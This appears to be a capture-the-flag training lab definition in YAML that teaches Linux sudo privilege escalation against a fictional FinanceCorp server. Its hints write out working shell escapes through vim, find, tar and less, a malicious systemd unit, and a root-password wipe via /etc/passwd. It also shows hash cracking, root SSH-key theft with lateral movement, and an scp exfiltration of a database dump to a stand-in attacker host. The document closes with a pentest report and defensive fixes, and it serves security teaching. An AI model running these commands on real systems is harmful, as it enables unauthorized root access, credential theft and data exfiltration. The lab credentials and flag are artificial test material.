@@ -1,0 +1,1162 @@
+name: SSH Privilege Escalation
+description: FinanceCorp requires assessment of privilege escalation risks. Check sudo permissions and identify privilege escalation opportunities after SSH authentication.
+difficulty: intermediate
+category: privilege-escalation
+duration_minutes: 120
+objectives:
+  - Understand sudo privileges and configuration
+  - Check user sudo permissions
+  - Identify privilege escalation vectors
+  - Execute privileged commands
+  - Capture the flag
+
+scenario: |
+  Your FinanceCorp penetration test reaches the privilege escalation phase. James
+  Mitchell wants you to demonstrate how standard user accounts can escalate to
+  administrative privileges.
+
+  Privilege escalation is the process of gaining higher privileges than initially
+  granted. In Linux systems, this typically means:
+  - User → Root (full administrative access)
+  - Limited sudo → Full sudo
+  - Restricted shell → Unrestricted shell
+  - Standard user → Service account
+
+  Common privilege escalation vectors:
+  - **sudo misconfiguration**: Overly permissive sudo rules
+  - **SUID binaries**: Programs that run with elevated privileges
+  - **Kernel exploits**: Operating system vulnerabilities
+  - **Cron jobs**: Scheduled tasks with weak permissions
+  - **Writable files**: Critical files with improper permissions
+  - **Password reuse**: Same password for multiple accounts
+
+  The sudo system allows controlled privilege elevation:
+  - Users can run specific commands as root
+  - Configured in /etc/sudoers
+  - Can require password or be passwordless
+  - Different rules for different users/groups
+
+  Common sudo configurations and risks:
+
+  **Full sudo access (DANGEROUS):**
+  ```
+  user ALL=(ALL:ALL) ALL
+  ```
+  - Can run any command as any user
+  - Direct path to root
+
+  **Specific commands (depends on command):**
+  ```
+  user ALL=(root) NOPASSWD: /usr/bin/vim
+  ```
+  - Can run vim as root without password
+  - vim can spawn shell: `:!sh` = root shell
+  - GTFOBins database documents exploitation
+
+  **Groups with sudo:**
+  ```
+  %sudo ALL=(ALL:ALL) ALL
+  ```
+  - Any user in sudo group has full access
+  - Check: `groups` command
+
+  Your objective: Authenticate to FinanceCorp's SSH server, check the user's sudo
+  privileges, and identify privilege escalation opportunities. Use sudo permissions
+  to access restricted information.
+
+  **Test Credentials:**
+  - Username: `backup`
+  - Password: `Backup2024#`
+
+flag: "OCR{sud0_3sc}"
+
+hints:
+  - text: |
+      **Privilege escalation fundamentals:**
+
+      **What is privilege escalation:**
+      - Gaining higher access than initially granted
+      - Standard user → root/administrator
+      - Critical for complete system compromise
+      - Often required to access sensitive data
+
+      **Types of privilege escalation:**
+
+      **Vertical escalation:**
+      - User → Root
+      - Limited privileges → Full privileges
+      - Standard account → Administrative account
+
+      **Horizontal escalation:**
+      - User A → User B (same privilege level)
+      - Access another user's data
+      - Impersonate different user
+
+      **Common Linux privilege escalation vectors:**
+
+      **1. sudo misconfiguration (MOST COMMON):**
+      - User in sudo group
+      - Specific commands allowed
+      - NOPASSWD configuration
+      - Wildcard in sudo rules
+      - Dangerous binaries (vim, find, awk, etc.)
+
+      **2. SUID binaries:**
+      - Programs that run as file owner
+      - If owner is root, runs with root privileges
+      - Find: `find / -perm -4000 2>/dev/null`
+      - Exploit: GTFOBins database
+
+      **3. Kernel exploits:**
+      - Vulnerabilities in Linux kernel
+      - Version-specific
+      - Local privilege escalation
+      - Example: DirtyC0w, DirtyCred
+
+      **4. Writable files:**
+      - /etc/passwd (if writable, add root user)
+      - /etc/shadow (if writable, change root password)
+      - Cron jobs (if writable, execute as root)
+      - Service configuration files
+
+      **5. Cron jobs:**
+      - Scheduled tasks running as root
+      - Writable script executed by cron
+      - PATH hijacking in cron scripts
+
+      **6. Password reuse:**
+      - Same password for multiple accounts
+      - User password = root password
+      - Service account passwords
+
+      **7. Capabilities:**
+      - Fine-grained privileges
+      - Alternative to SUID
+      - Check: `getcap -r / 2>/dev/null`
+
+      **The sudo system:**
+
+      **What is sudo:**
+      - "Super User DO"
+      - Execute commands as another user (usually root)
+      - Configured in /etc/sudoers
+      - Logs all sudo usage
+
+      **Checking sudo privileges:**
+      ```bash
+      sudo -l
+      ```
+      - Lists what current user can run with sudo
+      - Shows allowed commands
+      - Indicates if password required
+
+      **sudo configurations:**
+
+      **Full access:**
+      ```
+      user ALL=(ALL:ALL) ALL
+      ```
+      Means: user can run ALL commands as ALL users
+
+      **Specific command:**
+      ```
+      user ALL=(root) /usr/bin/systemctl restart apache2
+      ```
+      Means: Can only restart apache2 as root
+
+      **NOPASSWD:**
+      ```
+      user ALL=(root) NOPASSWD: /usr/bin/vim
+      ```
+      Means: Can run vim as root without entering password
+
+      **Wildcard danger:**
+      ```
+      user ALL=(root) /usr/bin/find *
+      ```
+      Means: Can run find with any arguments = privilege escalation
+
+      **sudo abuse examples:**
+
+      **vim/vi with sudo:**
+      ```bash
+      sudo vim
+      :!sh
+      # Now root shell
+      ```
+
+      **find with sudo:**
+      ```bash
+      sudo find /etc -exec /bin/sh \;
+      # Executes shell as root
+      ```
+
+      **less/more with sudo:**
+      ```bash
+      sudo less /etc/shadow
+      !sh
+      # Shell as root
+      ```
+
+      **GTFOBins:**
+      - Database of Unix binary exploits
+      - Shows how to abuse binaries for privilege escalation
+      - https://gtfobins.github.io/
+      - Essential resource for penetration testing
+
+      Privilege escalation is essential for complete system compromise.
+    unlock_after_minutes: 0
+
+  - text: |
+      **Checking and using sudo privileges:**
+
+      **sudo -l command:**
+      ```bash
+      $ sudo -l
+      [sudo] password for user:
+      ```
+      - Shows what user can run with sudo
+      - May require user's password
+      - Lists allowed commands and configurations
+
+      **Example outputs:**
+
+      **Full sudo access:**
+      ```bash
+      $ sudo -l
+      [sudo] password for backup:
+
+      User backup may run the following commands on fin-backup-01:
+          (ALL : ALL) ALL
+      ```
+      **Meaning:**
+      - Can run any command as any user
+      - Requires password
+      - Direct path to root: `sudo su -`
+
+      **Specific command with NOPASSWD:**
+      ```bash
+      $ sudo -l
+
+      User backup may run the following commands on fin-backup-01:
+          (root) NOPASSWD: /usr/bin/cat
+      ```
+      **Meaning:**
+      - Can run cat as root without password
+      - Can read any file: `sudo cat /etc/shadow`
+      - Can read root-only files
+
+      **Multiple commands:**
+      ```bash
+      $ sudo -l
+
+      User backup may run the following commands on fin-backup-01:
+          (root) NOPASSWD: /usr/bin/cat
+          (root) NOPASSWD: /bin/ls
+          (root) /usr/bin/vim
+      ```
+      **Meaning:**
+      - cat and ls without password
+      - vim with password
+      - vim = shell escape possible
+
+      **No sudo privileges:**
+      ```bash
+      $ sudo -l
+
+      Sorry, user backup may not run sudo on fin-backup-01.
+      ```
+      **Meaning:**
+      - No sudo access
+      - Must find other privilege escalation vectors
+
+      **Using sudo:**
+
+      **Run command as root:**
+      ```bash
+      $ sudo command
+      [sudo] password for user:
+      ```
+
+      **Run specific commands:**
+      ```bash
+      # Read root-only file
+      $ sudo cat /etc/shadow
+
+      # Edit system file
+      $ sudo vim /etc/passwd
+
+      # Restart service
+      $ sudo systemctl restart apache2
+
+      # Become root
+      $ sudo su -
+      # or
+      $ sudo -i
+      ```
+
+      **Run without password (if NOPASSWD):**
+      ```bash
+      $ sudo cat /root/flag.txt
+      # No password prompt, executes immediately
+      ```
+
+      **Exploiting sudo permissions:**
+
+      **If allowed: vim, vi, nano, emacs**
+      ```bash
+      $ sudo vim
+      :!sh
+      # Or
+      :!/bin/bash
+      # Now running shell as root
+      ```
+
+      **If allowed: find**
+      ```bash
+      $ sudo find /etc -exec /bin/sh \;
+      # Executes shell as root
+      ```
+
+      **If allowed: less, more**
+      ```bash
+      $ sudo less /etc/shadow
+      !sh
+      # Shell as root from within less
+      ```
+
+      **If allowed: cat (read any file)**
+      ```bash
+      $ sudo cat /etc/shadow
+      $ sudo cat /root/.ssh/id_rsa
+      $ sudo cat /root/flag.txt
+      ```
+
+      **If allowed: cp (copy files)**
+      ```bash
+      # Copy SSH key to gain access
+      $ sudo cp /root/.ssh/id_rsa /tmp/
+      $ sudo chmod 644 /tmp/id_rsa
+      $ cat /tmp/id_rsa
+      ```
+
+      **If allowed: tar**
+      ```bash
+      $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+      # Shell as root
+      ```
+
+      **Reading sudo configuration:**
+      ```bash
+      $ sudo cat /etc/sudoers
+      # If allowed, shows complete sudo configuration
+      ```
+
+      **Privilege escalation workflow:**
+
+      **Step 1: Check sudo permissions**
+      ```bash
+      $ sudo -l
+      ```
+
+      **Step 2: Identify exploitable commands**
+      - Check GTFOBins for exploitation method
+      - Look for shell escape sequences
+      - Identify file read capabilities
+
+      **Step 3: Exploit**
+      - Use allowed command to escalate
+      - Read sensitive files
+      - Gain root shell
+
+      **Step 4: Verify root access**
+      ```bash
+      # whoami
+      root
+      # id
+      uid=0(root) gid=0(root) groups=0(root)
+      ```
+
+      sudo permissions are the most common privilege escalation vector in Linux.
+    unlock_after_minutes: 5
+
+  - text: |
+      **Exploiting common sudo configurations:**
+
+      **Scenario 1: Full sudo access**
+
+      **Configuration:**
+      ```
+      user ALL=(ALL:ALL) ALL
+      ```
+
+      **Exploitation:**
+      ```bash
+      $ sudo su -
+      [sudo] password for user: [enter user password]
+      # root@server:~#
+      ```
+      **Result:** Full root access
+
+      **Alternative:**
+      ```bash
+      $ sudo -i
+      $ sudo /bin/bash
+      $ sudo sh
+      ```
+
+      **Scenario 2: cat with sudo**
+
+      **Configuration:**
+      ```
+      user ALL=(root) NOPASSWD: /usr/bin/cat
+      ```
+
+      **Exploitation:**
+      ```bash
+      # Read any file as root
+      $ sudo cat /etc/shadow
+      $ sudo cat /root/.ssh/id_rsa
+      $ sudo cat /root/flag.txt
+      $ sudo cat /etc/sudoers
+      ```
+
+      **Result:** Can read any file, including:
+      - Password hashes (/etc/shadow)
+      - Root SSH keys
+      - Sensitive files
+      - Configuration files
+
+      **Scenario 3: vim with sudo**
+
+      **Configuration:**
+      ```
+      user ALL=(root) NOPASSWD: /usr/bin/vim
+      ```
+
+      **Exploitation:**
+      ```bash
+      $ sudo vim
+      # In vim:
+      :!sh
+      # or
+      :!/bin/bash
+      # or
+      :set shell=/bin/bash
+      :shell
+      ```
+
+      **Result:** Root shell
+
+      **Or open privileged file:**
+      ```bash
+      $ sudo vim /etc/shadow
+      # Edit password hashes
+      # Change root password
+      ```
+
+      **Scenario 4: find with sudo**
+
+      **Configuration:**
+      ```
+      user ALL=(root) NOPASSWD: /usr/bin/find
+      ```
+
+      **Exploitation:**
+      ```bash
+      $ sudo find /etc -exec /bin/sh \;
+      # or
+      $ sudo find /etc -exec /bin/bash -p \;
+      ```
+
+      **Result:** Root shell
+
+      **Scenario 5: less/more with sudo**
+
+      **Configuration:**
+      ```
+      user ALL=(root) NOPASSWD: /usr/bin/less
+      ```
+
+      **Exploitation:**
+      ```bash
+      $ sudo less /etc/shadow
+      # Inside less, press:
+      !sh
+      # or
+      !/bin/bash
+      ```
+
+      **Result:** Root shell from less
+
+      **Or just read sensitive files:**
+      ```bash
+      $ sudo less /etc/shadow
+      $ sudo less /root/.ssh/id_rsa
+      ```
+
+      **Scenario 6: cp with sudo**
+
+      **Configuration:**
+      ```
+      user ALL=(root) NOPASSWD: /bin/cp
+      ```
+
+      **Exploitation:**
+      ```bash
+      # Copy sensitive files to readable location
+      $ sudo cp /etc/shadow /tmp/shadow
+      $ cat /tmp/shadow
+
+      # Copy SSH keys
+      $ sudo cp /root/.ssh/id_rsa /tmp/root_key
+      $ cat /tmp/root_key
+
+      # Or overwrite critical files
+      $ echo 'root::0:0:root:/root:/bin/bash' > /tmp/passwd
+      $ sudo cp /tmp/passwd /etc/passwd
+      # Root now has no password
+      ```
+
+      **Scenario 7: tar with sudo**
+
+      **Configuration:**
+      ```
+      user ALL=(root) NOPASSWD: /bin/tar
+      ```
+
+      **Exploitation:**
+      ```bash
+      $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+      ```
+
+      **Result:** Root shell
+
+      **Scenario 8: systemctl with sudo**
+
+      **Configuration:**
+      ```
+      user ALL=(root) NOPASSWD: /bin/systemctl
+      ```
+
+      **Exploitation:**
+      ```bash
+      # Create malicious service
+      $ cat > /tmp/evil.service << EOF
+      [Service]
+      Type=oneshot
+      ExecStart=/bin/sh -c "cat /root/flag.txt > /tmp/flag"
+      [Install]
+      WantedBy=multi-user.target
+      EOF
+
+      $ sudo systemctl link /tmp/evil.service
+      $ sudo systemctl start evil
+      $ cat /tmp/flag
+      ```
+
+      **Common sudo privilege escalation commands:**
+
+      **File viewers/editors:**
+      - vim, vi, nano, emacs → Shell escape
+      - less, more → Shell escape
+      - man → Shell escape
+
+      **File operations:**
+      - cat → Read any file
+      - cp → Copy sensitive files or overwrite system files
+      - mv → Move/rename files
+      - chmod → Change file permissions
+      - chown → Change file ownership
+
+      **Utilities:**
+      - find → Execute commands
+      - tar → Command execution
+      - zip → Command execution
+      - git → Shell escape
+      - awk → Command execution
+      - sed → File manipulation
+
+      **GTFOBins reference:**
+      - vim: `sudo vim -c ':!/bin/sh'`
+      - find: `sudo find . -exec /bin/sh \; -quit`
+      - awk: `sudo awk 'BEGIN {system("/bin/sh")}'`
+      - less: `sudo less /etc/hosts` then `!sh`
+
+      Understanding sudo configurations enables privilege escalation exploitation.
+    unlock_after_minutes: 10
+
+  - text: |
+      **Privilege escalation workflow for penetration testing:**
+
+      **Step 1: Initial enumeration**
+      ```bash
+      $ whoami
+      backup
+
+      $ id
+      uid=1004(backup) gid=1004(backup) groups=1004(backup)
+
+      $ groups
+      backup
+      ```
+
+      **Step 2: Check sudo privileges**
+      ```bash
+      $ sudo -l
+      [sudo] password for backup: [enter password]
+
+      User backup may run the following commands on fin-backup-01:
+          (root) NOPASSWD: /usr/bin/cat
+          (root) NOPASSWD: /bin/ls
+      ```
+
+      **Step 3: Identify exploitation opportunity**
+      - Can run cat as root without password
+      - Can read any file on the system
+      - Target: root-owned sensitive files
+
+      **Step 4: Exploit**
+      ```bash
+      # Read root directory
+      $ sudo ls -la /root
+      total 48
+      -rw------- 1 root root  156 Jan  4 10:00 .bash_history
+      -rw------- 1 root root 1766 Jan  3 15:00 .ssh/id_rsa
+      -rw-r--r-- 1 root root   45 Jan  4 11:00 flag.txt
+
+      # Read root flag
+      $ sudo cat /root/flag.txt
+      OCR{...}
+
+      # Read SSH key
+      $ sudo cat /root/.ssh/id_rsa
+      -----BEGIN RSA PRIVATE KEY-----
+      [SSH private key]
+      -----END RSA PRIVATE KEY-----
+
+      # Read shadow file
+      $ sudo cat /etc/shadow
+      root:$6$salt$hash...:18000:0:99999:7:::
+      ```
+
+      **Step 5: Document findings**
+      - Sudo permissions identified
+      - Exploitation method used
+      - Files accessed
+      - Potential for further exploitation
+
+      **For FinanceCorp assessment:**
+
+      **After authentication:**
+      ```bash
+      $ ssh backup@<target>
+      [authenticate with Backup2024#]
+
+      $ sudo -l
+      [enter password: Backup2024#]
+      [view allowed commands]
+      ```
+
+      **Look for:**
+      - What commands can be run as root?
+      - Is NOPASSWD configured?
+      - Can any command read files?
+      - Shell escape possibilities?
+
+      **Common targets with sudo cat:**
+      ```bash
+      # Root files
+      sudo ls -la /root
+      sudo cat /root/flag.txt
+      sudo cat /root/.bash_history
+
+      # System files
+      sudo cat /etc/shadow
+      sudo cat /etc/sudoers
+
+      # SSH keys
+      sudo cat /root/.ssh/id_rsa
+      sudo cat /home/otheruser/.ssh/id_rsa
+
+      # Application files
+      sudo cat /var/www/html/config.php
+      sudo cat /etc/mysql/debian.cnf
+      ```
+
+      **If you get shell escape capability:**
+      ```bash
+      $ sudo vim
+      :!sh
+      # id
+      uid=0(root) gid=0(root) groups=0(root)
+      ```
+
+      sudo privilege abuse is the primary privilege escalation vector in most systems.
+    unlock_after_minutes: 15
+
+  - text: |
+      To escalate privileges on FinanceCorp's server:
+
+      **Step 1: Authenticate**
+      ```bash
+      ssh backup@<target>
+      ```
+      - Username: `backup`
+      - Password: `Backup2024#`
+
+      **Step 2: Check sudo privileges**
+      ```bash
+      sudo -l
+      ```
+      - Enter password: `Backup2024#`
+      - Review allowed commands
+
+      **Step 3: Identify what you can do**
+      Look for commands like:
+      - cat (read files)
+      - vim/vi/nano (shell escape)
+      - find (command execution)
+      - less/more (shell escape)
+
+      **Step 4: Exploit sudo permissions**
+
+      **If cat is allowed:**
+      ```bash
+      # List root directory
+      sudo ls -la /root
+
+      # Read files
+      sudo cat /root/flag.txt
+      sudo cat /root/.bash_history
+      ```
+
+      **If vim is allowed:**
+      ```bash
+      sudo vim
+      :!sh
+      # Root shell
+      ```
+
+      **If find is allowed:**
+      ```bash
+      sudo find /etc -exec /bin/sh \;
+      # Root shell
+      ```
+
+      **Step 5: Look for the flag**
+
+      **Common flag locations with sudo:**
+      ```bash
+      sudo cat /root/flag.txt
+      sudo cat /root/.flag
+      sudo ls -la /root
+      ```
+
+      **Important:**
+      - Use `sudo -l` to see what's allowed
+      - Flag is accessible via sudo permissions
+      - May be in /root/ directory
+      - Requires using sudo to access
+
+      **Quick workflow:**
+      ```bash
+      # Check permissions
+      sudo -l
+
+      # List root files
+      sudo ls /root
+
+      # Read flag
+      sudo cat /root/flag.txt
+      ```
+
+      The flag is accessible using sudo privileges to read root-owned files.
+    unlock_after_minutes: 20
+
+  - text: |
+      Successful SSH authentication and privilege escalation:
+
+      ```bash
+      $ ssh backup@<target_ip>
+
+      backup@<target_ip>'s password: [Backup2024#]
+
+      Welcome to FinanceCorp Backup Server
+      Last login: Thu Jan 3 22:15:44 2025 from 10.10.14.15
+
+      backup@fin-backup-01:~$ whoami
+      backup
+
+      backup@fin-backup-01:~$ id
+      uid=1004(backup) gid=1004(backup) groups=1004(backup),1005(backupoperators)
+
+      backup@fin-backup-01:~$ groups
+      backup backupoperators
+
+      backup@fin-backup-01:~$ sudo -l
+      [sudo] password for backup: [Backup2024#]
+
+      Matching Defaults entries for backup on fin-backup-01:
+          env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+      User backup may run the following commands on fin-backup-01:
+          (root) NOPASSWD: /usr/bin/cat
+          (root) NOPASSWD: /bin/ls
+          (root) /usr/bin/tar
+
+      backup@fin-backup-01:~$ sudo ls -la /root
+      total 64
+      drwx------  5 root root 4096 Jan  4 11:30 .
+      drwxr-xr-x 18 root root 4096 Dec 15 08:15 ..
+      -rw-------  1 root root  892 Jan  4 11:30 .bash_history
+      -rw-r--r--  1 root root  220 Dec 15 08:15 .bash_logout
+      -rw-r--r--  1 root root 3771 Dec 15 08:15 .bashrc
+      -rw-r--r--  1 root root  807 Dec 15 08:15 .profile
+      drwx------  2 root root 4096 Jan  3 16:00 .ssh
+      drwxr-xr-x  2 root root 4096 Jan  4 09:00 backups
+      -rw-------  1 root root   45 Jan  4 11:00 flag.txt
+      -rw-r--r--  1 root root  512 Jan  4 10:30 backup-schedule.txt
+      drwxr-xr-x  3 root root 4096 Jan  3 15:30 scripts
+
+      backup@fin-backup-01:~$ sudo cat /root/flag.txt
+      OCR{...}
+
+      backup@fin-backup-01:~$ sudo cat /root/.bash_history
+      ls -la
+      cd /var/backups
+      tar -czf financecorp-backup-2025-01-03.tar.gz /var/www/html /etc
+      mysql -u root -p
+      mysqldump -u root -p --all-databases > /root/backups/mysql-backup-2025-01-03.sql
+      cat /etc/shadow
+      vim /etc/sudoers
+      systemctl restart mysql
+      cd /root/scripts
+      ./backup-rotation.sh
+      cat /root/backup-schedule.txt
+
+      backup@fin-backup-01:~$ sudo cat /root/backup-schedule.txt
+      FinanceCorp Backup Schedule
+      ===========================
+
+      Daily Backups (02:00 AM):
+      - Web application files: /var/www/html
+      - Database dump: All MySQL databases
+      - Configuration files: /etc
+
+      Weekly Backups (Sunday 03:00 AM):
+      - Full system backup
+      - User home directories
+      - Log archives
+
+      Monthly Backups (1st of month, 04:00 AM):
+      - Complete system image
+      - Offsite replication
+
+      Backup Location: /var/backups/financecorp/
+      Remote Backup Server: backup-remote.financecorp.local (10.10.10.120)
+
+      Retention Policy:
+      - Daily: 7 days
+      - Weekly: 4 weeks
+      - Monthly: 12 months
+
+      Emergency Restore Contact: it@financecorp.local
+
+      backup@fin-backup-01:~$ sudo cat /etc/shadow
+      root:$6$rounds=4096$saltsaltsal$hashhashhashhashhashhashhashhashhashhashhashhashhashhashhashhashhash:19000:0:99999:7:::
+      backup:$6$rounds=4096$backupsalt$hashhashhashhashhashhashhashhashhashhashhashhashhashhashhashhash:19000:0:99999:7:::
+      jmitchell:$6$rounds=4096$jmsalt$hashhashhashhashhashhashhashhashhashhashhashhashhashhashhash:19000:0:99999:7:::
+      webadmin:$6$rounds=4096$websalt$hashhashhashhashhashhashhashhashhashhashhashhashhashhashhash:19000:0:99999:7:::
+      developer:$6$rounds=4096$devsalt$hashhashhashhashhashhashhashhashhashhashhashhashhashhashhash:19000:0:99999:7:::
+      sysadmin:$6$rounds=4096$sysalt$hashhashhashhashhashhashhashhashhashhashhashhashhashhashhash:19000:0:99999:7:::
+
+      backup@fin-backup-01:~$ sudo cat /root/.ssh/id_rsa
+      -----BEGIN OPENSSH PRIVATE KEY-----
+      b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+      NhAAAAAwEAAQAAAQEAx5vN2xP4rT6sV8wX9yZ0aB1cD2eE3fG4hH5iI6jJ7kK8lL9mM0nN
+      [truncated for brevity - this would be a complete SSH private key]
+      -----END OPENSSH PRIVATE KEY-----
+
+      backup@fin-backup-01:~$ sudo ls -la /root/.ssh/
+      total 20
+      drwx------ 2 root root 4096 Jan  3 16:00 .
+      drwx------ 5 root root 4096 Jan  4 11:30 ..
+      -rw------- 1 root root 2602 Jan  3 16:00 id_rsa
+      -rw-r--r-- 1 root root  571 Jan  3 16:00 id_rsa.pub
+      -rw-r--r-- 1 root root  444 Jan  4 09:00 authorized_keys
+
+      backup@fin-backup-01:~$ sudo cat /root/.ssh/authorized_keys
+      ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDHm83bE/itPqxXzBf3JnRoHVwPZ4Td8biEfmIjqMnuQryUv2YzSc0... root@fin-admin-01
+      ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx9K2mN3pP4qR5sT7vU8wW9xY0ZA1bC... admin@workstation
+
+      backup@fin-backup-01:~$ sudo cat /var/backups/financecorp/latest.info
+      Last Backup: 2025-01-04 02:00:15
+      Backup File: financecorp-backup-2025-01-04.tar.gz
+      Size: 2.4 GB
+      Status: SUCCESS
+      Duration: 15m 32s
+
+      Files Backed Up:
+      - /var/www/html (234 MB)
+      - /etc (45 MB)
+      - MySQL databases (1.8 GB)
+      - User home directories (312 MB)
+
+      Verification: PASSED
+      Checksum: sha256:abc123def456...
+
+      backup@fin-backup-01:~$ sudo ls -la /root/backups/
+      total 1856384
+      drwxr-xr-x 2 root root      4096 Jan  4 09:00 .
+      drwx------ 5 root root      4096 Jan  4 11:30 ..
+      -rw-r--r-- 1 root root 524288000 Jan  2 02:15 mysql-backup-2025-01-02.sql
+      -rw-r--r-- 1 root root 531456000 Jan  3 02:15 mysql-backup-2025-01-03.sql
+      -rw-r--r-- 1 root root 538624000 Jan  4 02:15 mysql-backup-2025-01-04.sql
+
+      backup@fin-backup-01:~$
+      ```
+
+      **Flag location: /root/flag.txt**
+      - **File**: `/root/flag.txt`
+      - **Access method**: `sudo cat /root/flag.txt`
+      - **Flag**: `OCR{...}`
+      - **Privilege required**: sudo cat permission
+
+      **Critical security findings:**
+
+      **1. sudo permissions with NOPASSWD (HIGH):**
+
+      **Configuration:**
+      ```
+      User backup may run the following commands on fin-backup-01:
+          (root) NOPASSWD: /usr/bin/cat
+          (root) NOPASSWD: /bin/ls
+          (root) /usr/bin/tar
+      ```
+
+      **Security impact:**
+      - Can read ANY file as root (cat)
+      - Can list ANY directory as root (ls)
+      - Can execute tar as root (with password)
+      - No password required for cat and ls
+      - Complete information disclosure
+
+      **2. Password hashes accessible (CRITICAL):**
+
+      **via sudo cat /etc/shadow:**
+      - All user password hashes readable
+      - Can attempt offline cracking
+      - Includes root, jmitchell, webadmin, developer, sysadmin
+      - $6$ = SHA-512 (strong but crackable with weak passwords)
+
+      **Exploitation:**
+      ```bash
+      $ sudo cat /etc/shadow > /tmp/shadow
+      $ john /tmp/shadow --wordlist=rockyou.txt
+      # Crack passwords offline
+      ```
+
+      **3. Root SSH private key accessible (CRITICAL):**
+
+      **via sudo cat /root/.ssh/id_rsa:**
+      - Complete root SSH private key disclosed
+      - Can use to SSH as root to other systems
+      - authorized_keys shows root has access from fin-admin-01
+
+      **Exploitation:**
+      ```bash
+      $ sudo cat /root/.ssh/id_rsa > /tmp/root_key
+      $ chmod 600 /tmp/root_key
+      $ ssh -i /tmp/root_key root@other-server
+      # Root access to other systems
+      ```
+
+      **4. Root command history readable (MEDIUM):**
+
+      **via sudo cat /root/.bash_history:**
+      - Reveals root's activities
+      - Shows database operations (MySQL)
+      - Reveals backup procedures
+      - Shows root accessed /etc/shadow
+      - Shows sudo configuration edits
+
+      **Intelligence gathered:**
+      - Root uses MySQL with interactive password
+      - Backup scripts location: /root/scripts
+      - Sudoers file edited recently
+      - System administration patterns
+
+      **5. Backup information accessible (MEDIUM):**
+
+      **Complete backup intelligence:**
+      - Backup schedule and retention
+      - Backup server: 10.10.10.120 (backup-remote.financecorp.local)
+      - Daily backups at 02:00 AM
+      - Backup includes MySQL databases (1.8 GB of sensitive data)
+      - Backup location: /var/backups/financecorp/
+
+      **6. Database backups readable (CRITICAL):**
+
+      **via sudo ls /root/backups/:**
+      - Daily MySQL dumps available
+      - 500+ MB each (complete database dumps)
+      - Three days of backups present
+      - Potentially contains all application data
+
+      **Exploitation:**
+      ```bash
+      $ sudo cat /root/backups/mysql-backup-2025-01-04.sql > /tmp/db.sql
+      # Extract database dump
+      # Contains all user data, credentials, financial records
+      ```
+
+      **Complete attack chain:**
+
+      **Step 1: Initial access**
+      - SSH as backup:Backup2024#
+
+      **Step 2: Privilege enumeration**
+      - sudo -l reveals cat/ls with NOPASSWD
+
+      **Step 3: Information gathering**
+      ```bash
+      sudo cat /etc/shadow          # Password hashes
+      sudo cat /root/.ssh/id_rsa    # Root SSH key
+      sudo ls /root/backups          # Database backups
+      ```
+
+      **Step 4: Credential harvesting**
+      ```bash
+      # Extract and crack passwords
+      sudo cat /etc/shadow > /tmp/shadow
+      john /tmp/shadow
+
+      # Steal root SSH key
+      sudo cat /root/.ssh/id_rsa > /tmp/root_key
+      chmod 600 /tmp/root_key
+      ```
+
+      **Step 5: Database exfiltration**
+      ```bash
+      # Copy database dump
+      sudo cat /root/backups/mysql-backup-2025-01-04.sql > /tmp/database.sql
+      # Transfer off system
+      scp /tmp/database.sql attacker@external:~/
+      ```
+
+      **Step 6: Lateral movement**
+      ```bash
+      # Use root SSH key on other systems
+      ssh -i /tmp/root_key root@10.10.10.100  # Database server
+      ssh -i /tmp/root_key root@10.10.10.62   # Web server
+      ssh -i /tmp/root_key root@10.10.10.120  # Remote backup
+      ```
+
+      **Step 7: Privilege escalation (if needed)**
+      ```bash
+      # tar can be exploited for root shell
+      $ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+      # id
+      uid=0(root) gid=0(root) groups=0(root)
+      ```
+
+      **Professional penetration testing report:**
+
+      **FINDING: sudo cat Permission Allows Complete Information Disclosure**
+      - Severity: CRITICAL
+      - User: backup
+      - Permission: (root) NOPASSWD: /usr/bin/cat
+      - Impact: Can read ANY file on system including /etc/shadow, SSH keys, database dumps
+      - Proof: Successfully read /etc/shadow, root SSH key, database backups
+      - Recommendation: Remove cat from sudo permissions, use specific backup scripts with limited scope
+
+      **FINDING: Root SSH Private Key Disclosure**
+      - Severity: CRITICAL
+      - File: /root/.ssh/id_rsa
+      - Access: sudo cat /root/.ssh/id_rsa
+      - Impact: Root access to multiple systems, lateral movement across infrastructure
+      - Recommendation: Rotate SSH keys, restrict sudo permissions, implement SSH certificates
+
+      **FINDING: Password Hash Exposure**
+      - Severity: CRITICAL
+      - File: /etc/shadow
+      - Access: sudo cat /etc/shadow
+      - Impact: All user passwords vulnerable to offline cracking
+      - Recommendation: Remove cat permission, implement stronger password policy, MFA
+
+      **FINDING: Database Backup Exposure**
+      - Severity: CRITICAL
+      - Location: /root/backups/
+      - Size: 500+ MB per day (all application data)
+      - Impact: Complete database exfiltration, customer data breach
+      - Recommendation: Encrypt backups, restrict access, move to secure backup system
+
+      **FINDING: tar with sudo (Privilege Escalation)**
+      - Severity: HIGH
+      - Permission: (root) /usr/bin/tar (requires password)
+      - Exploitation: GTFOBins tar shell escape
+      - Impact: Direct path to root shell
+      - Recommendation: Remove tar from sudo, use dedicated backup user/scripts
+
+      **Defense recommendations:**
+      1. **Never allow unrestricted cat/ls with sudo**
+      2. Use purpose-built backup scripts with minimal privileges
+      3. Implement principle of least privilege
+      4. Encrypt sensitive backups
+      5. Store backups outside main system
+      6. Rotate SSH keys regularly
+      7. Implement MFA for privileged accounts
+      8. Regular sudo configuration audits
+      9. Monitor sudo usage (all commands logged)
+      10. User security training on sudo risks
+
+      **Secure backup alternative:**
+      Instead of giving backup user sudo cat, create specific backup script:
+      ```bash
+      # /usr/local/bin/backup-script (owned by root, 750)
+      #!/bin/bash
+      tar -czf /backups/backup-$(date +%Y%m%d).tar.gz \
+          /var/www/html \
+          /etc
+      # Only backs up specific directories, no arbitrary file read
+      ```
+
+      **Sudoers entry:**
+      ```
+      backup ALL=(root) NOPASSWD: /usr/local/bin/backup-script
+      # Can only run specific backup script, not arbitrary cat
+      ```
+
+      **Lessons for security:**
+      - sudo cat = complete information disclosure
+      - Any file read capability exposes entire system
+      - NOPASSWD eliminates protection layer
+      - Backup accounts are high-value targets
+      - Root SSH keys enable multi-system compromise
+      - Database backups contain all sensitive data
+      - sudo monitoring is essential
+
